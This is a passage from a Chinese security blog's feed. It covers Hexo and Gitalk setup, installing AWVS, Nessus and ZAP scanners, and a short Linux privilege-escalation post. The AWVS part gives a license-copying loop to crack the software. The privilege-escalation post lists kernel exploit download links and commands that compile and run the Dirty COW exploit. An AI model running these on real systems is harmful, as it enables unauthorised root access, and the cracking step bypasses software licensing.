categories</code>就是分配分类目录了，没有的可以按这样配置，下面就是创建了。</p><h3 id="3-2-2-创建分类"><a href="#3-2-2-创建分类" class="headerlink" title="3.2.2 创建分类"></a>3.2.2 创建分类</h3><p>跟创建<code>云标签</code>一样：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>source</code>目录下生成一个<code>categories\index.md</code>文件，编辑它：</p><pre class="line-numbers language-bash"><code class="language-bash">---date: 2017-01-12 02:23:17title: categoriestype: <span class="token string">"categories"</span>comments: <span class="token boolean">false</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一篇说道<code>type</code>值为<code>tags</code>是标签云，这里是分类<code>categories</code>。就这么简单不用再做其他输入。</p><p><img src="/2020/08/26/hexo-guide/1599186880480.png" alt="1599186880480"></p><h1 id="4-评论系统搭建"><a href="#4-评论系统搭建" class="headerlink" title="4 评论系统搭建"></a>4 评论系统搭建</h1><p>我用的主题版本是3.5的。主题目前支持Disqus，多说[倒闭了]及友言[倒闭了]评论，还有valine,wildfire,gitalk。其中Disqus是国外的第三方评论插件，如果没有翻墙的话，是无法显示的。并且在使用该第三方评论插件的时候，需要先注册才能用。网上发现大家都在用gitalk，因此我也打算入手一波。步骤如下：</p><p><strong>（1）申请ClientID和ClientSecrets</strong></p><p>注册一个 Github OAuth application: <a href="https://github.com/settings/applications/new">https://github.com/settings/applications/new</a></p><p>记下 <code>clientID</code> 和 <code>clientSecret</code></p><p><img src="/2020/08/26/hexo-guide/1613701655740.png" alt="1613701655740"></p><p><img src="/2020/08/26/hexo-guide/1613645427696.png" alt="1613645427696"></p><p><strong>（2）在主题配置文件 _config.yml 中添加</strong></p><p>将on改为true，然后写上第一步申请到的clinetID和 clientSecret，repo可以直接填写博客对应的仓库没，除此之外，还有其他很多参数，有兴趣的话可以 <a href="https://github.com/gitalk/gitalk#options">点这里</a>。 </p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">gitalk</span><span class="token punctuation">:</span>  <span class="token key atrule">on</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">clientID</span><span class="token punctuation">:</span> <span class="token string">'xxxxxx'</span>  <span class="token key atrule">clientSecret</span><span class="token punctuation">:</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>  <span class="token key atrule">repo</span><span class="token punctuation">:</span> 'm01ly.github.io'//存储你评论 issue 的 Github 仓库名（建议直接用 GitHub Page 的仓库名）  <span class="token key atrule">owner</span><span class="token punctuation">:</span> <span class="token string">'m01ly'</span>  <span class="token key atrule">admin</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'m01ly'</span><span class="token punctuation">]</span>//这个仓库的管理员，可以有多个，用数组表示，一般写自己<span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后部署上线，就会看到未找到相关的Issues进行评论，并且有个404错误，这里忘记截图啦，然后网上看了原因，什么字段太长啥的都不是，后面看F12，查看404错误的原因，点击链接进入下图，然后点击access后，再刷新页面，登录github账号，就可以啦。</p><p><img src="/2020/08/26/hexo-guide/1613714256885.png" alt="1613714256885"></p><p>但是有个小问题，Gitalk 需要你点开每篇文章的页面才会创建对应的 issue,文章多的人，可以参考<a href="https://draveness.me/git-comments-initialize">这篇 自动初始化Gitalk和Gitment评论</a>就解决了这个问题。</p><p><img src="/2020/08/26/hexo-guide/1613714581563.png" alt="1613714581563"></p><p>参考：</p><p><a href="http://github.shadowwu.club/2017/12/19/Gittalk%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%B5%8B%E8%AF%95/">为博客添加 Gitalk 评论插件</a></p><p><a href="https://draveness.me/git-comments-initialize">自动初始化Gitalk和Gitment评论</a></p><h1 id="5-基本命令使用"><a href="#5-基本命令使用" class="headerlink" title="5 基本命令使用"></a>5 基本命令使用</h1><p>在根目录下blog/Hexo下右击，点击“git bash here”，然后进行文章的发布管理等。</p><p><img src="/2020/08/26/hexo-guide/1613635158320.png" alt="1613635158320"></p><p>hexo部分常用命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo n <span class="token string">"博客名称"</span>  <span class="token operator">=</span><span class="token operator">></span> hexo new <span class="token string">"博客名称"</span>   <span class="token comment" spellcheck="true">#这两个都是创建新文章，前者是简写模式</span>$ hexo clean <span class="token comment" spellcheck="true">#清空本地导出的博客</span>$ hexo g  <span class="token operator">=</span><span class="token operator">></span> hexo generate  <span class="token comment" spellcheck="true">#生成</span>$ hexo s  <span class="token operator">=</span><span class="token operator">></span> hexo server  <span class="token comment" spellcheck="true">#本地服务器浏览</span>$ hexo d  <span class="token operator">=</span><span class="token operator">></span> hexo deploy  <span class="token comment" spellcheck="true">#部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server   <span class="token comment" spellcheck="true">#Hexo 会监视文件变动并自动更新，无须重启服务器。</span>$ hexo server -s   <span class="token comment" spellcheck="true">#静态模式</span>$ hexo server -p 5000   <span class="token comment" spellcheck="true">#更改端口</span>$ hexo server -i 192.168.1.1   <span class="token comment" spellcheck="true">#自定义IP</span>$ hexo clean   <span class="token comment" spellcheck="true">#清除缓存，网页正常情况下可以忽略此条命令</span>$ hexo g   <span class="token comment" spellcheck="true">#生成静态网页</span>$ hexo d   <span class="token comment" spellcheck="true">#开始部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6 注意事项"></a>6 注意事项</h1><p>md文件命名最好英文</p><p>用yelee主题的博客：</p><p><a href="https://www.gokuweb.com/web/39c1ec60.html">https://www.gokuweb.com/web/39c1ec60.html</a> </p><p><a href="https://sogrey.top/article/">https://sogrey.top/article/</a> </p><p>  [<a href="https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]">https://durant35.github.io/2016/09/16/hexo_Theme%20Yelee%20Migrant%20Note/#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF]</a>(<a href="https://durant35.github.io/2016/09/16/hexo_Theme">https://durant35.github.io/2016/09/16/hexo_Theme</a> Yelee Migrant Note/#自定义版权信息)   好的文章推荐–待安装</p><p> <a href="https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">https://os_heartstill.gitee.io/chih-ping/2019/05/10/Hexo%E7%9A%84Yelee%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</a> </p><h1 id="7-常见报错"><a href="#7-常见报错" class="headerlink" title="7 常见报错"></a>7 常见报错</h1><p><strong>hexo s报错如下：</strong></p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo gINFO  Validating configINFO  Start processingFATAL <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  err: TypeError <span class="token punctuation">[</span>ERR_INVALID_URL<span class="token punctuation">]</span>: Invalid URL: http://www.linuxidc.com<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>      at onParseError <span class="token punctuation">(</span>internal/url.js:256:9<span class="token punctuation">)</span>      at new URL <span class="token punctuation">(</span>internal/url.js:332:5<span class="token punctuation">)</span>      at encodeURL <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-util\lib\encode_url.js:8:20<span class="token punctuation">)</span>      at Renderer.link <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:56:27<span class="token punctuation">)</span>      at Parser.parseInline <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:211:27<span class="token punctuation">)</span>      at Parser.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:162:47<span class="token punctuation">)</span>      at Function.parse <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\Parser.js:27:19<span class="token punctuation">)</span>      at marked <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\marked\src\marked.js:110:19<span class="token punctuation">)</span>      at Hexo.module.exports <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\hexo-renderer-marked\lib\renderer.js:138:10<span class="token punctuation">)</span>      at Hexo.tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Hexo.<span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\method.js:15:34<span class="token punctuation">)</span>      at C:\blog\Hexo\node_modules\hexo\lib\hexo\render.js:75:22      at tryCatcher <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\util.js:16:23<span class="token punctuation">)</span>      at Promise._settlePromiseFromHandler <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:547:31<span class="token punctuation">)</span>      at Promise._settlePromise <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:604:18<span class="token punctuation">)</span>      at Promise._settlePromiseCtx <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\promise.js:641:10<span class="token punctuation">)</span>      at _drainQueueStep <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:97:12<span class="token punctuation">)</span>      at _drainQueue <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:86:9<span class="token punctuation">)</span>      at Async._drainQueues <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:102:5<span class="token punctuation">)</span>      at Immediate.Async.drainQueues <span class="token punctuation">[</span>as _onImmediate<span class="token punctuation">]</span> <span class="token punctuation">(</span>C:\blog\Hexo\node_modules\bluebird\js\release\async.js:15:14<span class="token punctuation">)</span>      at processImmediate <span class="token punctuation">(</span>internal/timers.js:456:21<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    input: <span class="token string">'http://www.linuxidc.com]#'</span>,    code: <span class="token string">'ERR_INVALID_URL'</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; Something's wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1613635511527.png" alt="1613635511527"></p><p><strong>solution：</strong></p><p>后面发现是因为代码格式的代码有问题，所以造成报错。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWVS和Nessus镜像安装</title>
      <link href="/2020/08/26/scan-awvs-nessus/"/>
      <url>/2020/08/26/scan-awvs-nessus/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>文章来自：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247498179&idx=2&sn=fa6f117c420bc52306508fe81af3b4d3&chksm=ec26d85bdb51514d6def0629e0c71ed5506b1939a9f69b30ff47d977fab8cc96dc15af16fb1c&mpshare=1&scene=23&srcid=1031d22NMZJcOV53f1sF2DPA&sharer_sharetime=1604139889173&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">漏洞扫描—Awvs&amp;Nessus(Docker版V3.0)–雷石安全</a>,雷石实验室维护的AWVS和Nessus镜像，可以去<a href="https://hub.docker.com/r/leishianquan/awvs-nessus/tags?page=1&ordering=last_updated">docker hub</a>上查看最新版本</p><a id="more"></a><h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>pull 拉取下载镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull leishianquan/awvs-nessus:v03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是访问Nessus需要进入容器启动Nessus 服务：</p><p>查看容器</p><pre class="line-numbers language-bash"><code class="language-bash">Docker <span class="token function">ps</span> –a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动容器</p><pre class="line-numbers language-bash"><code class="language-bash">Docker start 容器id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入容器</p><pre class="line-numbers language-bash"><code class="language-bash">Docker <span class="token function">exec</span> -it 容器id <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动nessus服务</p><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibeH92QHbQD44DXRNGic4ict95lS3S8njU849xaucOJJfGf815PCewlFrdQQKSyo9lDNSEdVGUfnibEw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>破解awvs：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /home/license_info.json /home/acunetix/.acunetix/data/license/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h1><p><strong>Nessus:</strong></p><p><a href="https://127.0.0.1:8834/#/">https://127.0.0.1:8834/#/</a></p><p>nessus username:leishi</p><p>nessus password:leishianquan</p><p><strong>Awvs</strong>：</p><p><a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><p>awvs13 username: <a href="mailto:&#108;&#101;&#105;&#x73;&#x68;&#x69;&#x40;&#x6c;&#101;&#x69;&#115;&#x68;&#105;&#x2e;&#x63;&#x6f;&#x6d;">&#108;&#101;&#105;&#x73;&#x68;&#x69;&#x40;&#x6c;&#101;&#x69;&#115;&#x68;&#105;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p>awvs13 password: Leishi123</p><h1 id="3-注意事项"><a href="#3-注意事项" class="headerlink" title="3 注意事项"></a>3 注意事项</h1><p>这里需要注意，这个docker镜像有点小bug:AWVS证书用了一会后容易失效，出现如下图所示。这里我采取的笨方法是一直cp证书，代码如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">" while true ;do cp /home/license_info.json /home/acunetix/.acunetix/data/license/; sleep 1; done; "</span> <span class="token operator">></span> t.sh<span class="token function">chmod</span> 777 t.sh<span class="token function">nohup</span> ./t.sh <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/scan-awvs-nessus/1604372586478.png" alt="1604372586478"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZAP的安装和使用</title>
      <link href="/2020/08/26/scan-zap/"/>
      <url>/2020/08/26/scan-zap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>官网<a href="https://www.zaproxy.org/">https://www.zaproxy.org/</a></p><p>较好的教程：<a href="https://www.wangan.com/docs/802">https://www.wangan.com/docs/802</a></p><p>官网可以下载软件，也可安装docker版本的</p><a id="more"></a><h1 id="0-前提"><a href="#0-前提" class="headerlink" title="0 前提"></a>0 前提</h1><p>需要java8的环境，查看java版本命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$java</span> -version<span class="token variable">$which</span> java<span class="token variable">$whereis</span> java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果装了java 7,8 ，当前java 为java7，只需要切换版本即可，即重新设置环境变量</p><p>(2)修改环境变量</p><p>$vi /etc/profile </p><p>设置如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_60<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(3)环境变量生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="1-docker安装ZAP"><a href="#1-docker安装ZAP" class="headerlink" title="1  docker安装ZAP"></a>1  docker安装ZAP</h1><p>进入官网<a href="https://www.zaproxy.org/download/">下载页面</a>，往下拉可以看到docker下载地址，这里我们选择stable，稳定版本，然后按照官网的<a href="https://www.zaproxy.org/docs/docker/about/">guide</a>逐步按照即可。</p><p><img src="/2020/08/26/scan-zap/1604399364254.png" alt="1604399364254"></p><p>(1) 拉取镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull owasp/zap2docker-stable:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/scan-zap/1604399706466.png" alt="1604399706466"></p><p>（2）启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意一定是<a href="http://10.27.22.92:8080/zap/%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AFhttp://10.27.22.92:8080%E4%BC%9A%E5%87%BA%E7%8E%B0%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E3%80%82%E5%BC%80%E5%A7%8B%E5%87%BA%E7%8E%B0%E6%98%AF%E5%B0%8F%E5%B1%8F%E5%B9%95%EF%BC%8C%E7%82%B9%E5%87%BB%E5%85%A8%E5%B1%8F%E5%8D%B3%E5%8F%AF%E3%80%82">http://10.27.22.92:8080/zap/，如果是http://10.27.22.92:8080会出现输入用户名密码。开始出现是小屏幕，点击全屏即可。</a></p><p><img src="/2020/08/26/scan-zap/1604409202576.png" alt="1604409202576"></p><h1 id="2-直接安装"><a href="#2-直接安装" class="headerlink" title="2 直接安装"></a>2 直接安装</h1><p>适用于可以有界面的终端</p><pre><code>[root@m01ly ~]# wget https://github.com/zaproxy/zaproxy/releases/download/v2.9.0/ZAP_2_9_0_unix.sh</code></pre><p><img src="/2020/08/26/scan-zap/1604405494656.png" alt="1604405494656"></p><p>（2）安装</p><pre><code>[root@m01ly ~]# chmod 777 ZAP_2_9_0_unix.sh[root@m01ly ~]# ./ZAP_2_9_0_unix.sh</code></pre><p>弹出界面：</p><p><img src="/2020/08/26/scan-zap/1604405604464.png" alt="1604405604464"></p><p><img src="/2020/08/26/scan-zap/1604405660783.png" alt="1604405660783"></p><p>默认安装路径位于/usr/local/zaproxy中，同时在用户目录下存在一个文件，位置为/home/admin/.ZAP，里面存放了软件的配置文件(config.xml)、脚本文件（community-scripts)、插件文件（plugin）、策略配置文件（policies）、远程调用会话保存目录（session）、本地启动文件会话（sessions）等重要文件；<strong>注意每次软件关闭时候，就会保存配置</strong>，所以配置文件的内容是最后一次软件关闭前的配置 </p><p><img src="/2020/08/26/scan-zap/1604405876783.png" alt="1604405876783"></p><p>执行zap.sh</p><pre><code>[root@m01ly zaproxy]# ./zap.sh</code></pre><p>在虚拟机之外弹出了ZAP，说实话第一次安装有点吓一跳。</p><p><img src="/2020/08/26/scan-zap/1604406130388.png" alt="1604406130388"></p><p>这里注意如果是堡垒机去安装，则不适合这种安装方式，会出现如图所示的错误，最好选择docker版本的。</p><p><img src="/2020/08/26/scan-zap/1604407388145.png" alt="1604407388145"></p><pre><code>./zap.sh -daemon</code></pre><p>虽然启动成功， 但却无法在linux上启动后直接打开zap程序 </p><h1 id="3-特性"><a href="#3-特性" class="headerlink" title="3 特性"></a>3 特性</h1><p>缺点：报告格式仅仅支持html,xml不支持csv,excel。</p><p>优点：集扫描，拦截（bp的功能），使用于个人渗透测试。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/528e6ffd6d29">ZAP使用教程</a></p><p><a href="https://www.cnblogs.com/haohao111/p/11769727.html">安装教程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权</title>
      <link href="/2020/08/26/pt-tiquan/"/>
      <url>/2020/08/26/pt-tiquan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>待完善</p><a id="more"></a><pre><code>wget https://github.com/mzet-/linux-exploit-suggesterchmod 777 les.sh./les.sh</code></pre><p><img src="/2020/08/26/pt-tiquan/1604483327437.png" alt="1604483327437"></p><pre><code>Available information:Kernel version: 3.10.0Architecture: x86_64Distribution: RHELDistribution version: 18.04Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performedPackage listing: N/ASearching among:74 kernel space exploits0 user space exploitsPossible Exploits:[+] [CVE-2016-5195] dirtycow   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,ubuntu=16.04|14.04|12.04   Download URL: https://www.exploit-db.com/download/40611   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2016-5195] dirtycow 2   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;   Download URL: https://www.exploit-db.com/download/40839   ext-url: https://www.exploit-db.com/download/40847   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2019-15666] XFRM_UAF   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc   Exposure: less probable   Download URL:    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled[+] [CVE-2017-7308] af_packet   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html   Exposure: less probable   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#39;ext-url&#39; adds support for additional kernels[+] [CVE-2017-6074] dccp   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3   Exposure: less probable   Tags: ubuntu=(14.04|16.04)&#123;kernel:4.4.0-62-generic&#125;   Download URL: https://www.exploit-db.com/download/41458   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass[+] [CVE-2017-1000253] PIE_stack_corruption   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt   Exposure: less probable   Tags: RHEL=6,RHEL=7&#123;kernel:3.10.0-514.21.2|3.10.0-514.26.1&#125;   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c[+] [CVE-2016-2384] usb-midi   Details: https://xairy.github.io/blog/2016/cve-2016-2384   Exposure: less probable   Tags: ubuntu=14.04,fedora=22   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user[+] [CVE-2015-9322] BadIRET   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/   Exposure: less probable   Tags: RHEL&lt;=7,fedora=20   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Tags: ubuntu=(14.04|15.10)&#123;kernel:4.2.0-(18|19|20|21|22)-generic&#125;   Download URL: https://www.exploit-db.com/download/39166[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/39230[+] [CVE-2014-5207] fuse_suid   Details: https://www.exploit-db.com/exploits/34923/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/34923[+] [CVE-2014-4014] inode_capable   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4   Exposure: less probable   Tags: ubuntu=12.04   Download URL: https://www.exploit-db.com/download/33824[+] [CVE-2014-0196] rawmodePTY   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html   Exposure: less probable   Download URL: https://www.exploit-db.com/download/33516[+] [CVE-2014-0038] timeoutpwn   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=13.10   Download URL: https://www.exploit-db.com/download/31346   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2014-0038] timeoutpwn 2   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=(13.04|13.10)&#123;kernel:3.(8|11).0-(12|15|19)-generic&#125;   Download URL: https://www.exploit-db.com/download/31347   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2016-0728] keyring   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/40003   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</code></pre><h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2 漏洞利用"></a>2 漏洞利用</h1><ul><li><p>Windows平台提权漏洞集合：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>Linux平台提权漏洞集合：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></li></ul><p>2.1 脏牛利用</p><pre><code>$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000</code></pre><p><img src="/2020/08/26/pt-tiquan/1604484107935.png" alt="1604484107935"></p><p><a href="https://blog.csdn.net/prettyX/article/details/103923947">https://blog.csdn.net/prettyX/article/details/103923947</a></p><pre><code>gcc -pthread dirtyroot.c -o dirtyroot</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS安全检测小工具</title>
      <link href="/2020/08/26/htps-tools/"/>
      <url>/2020/08/26/htps-tools/</url>
      
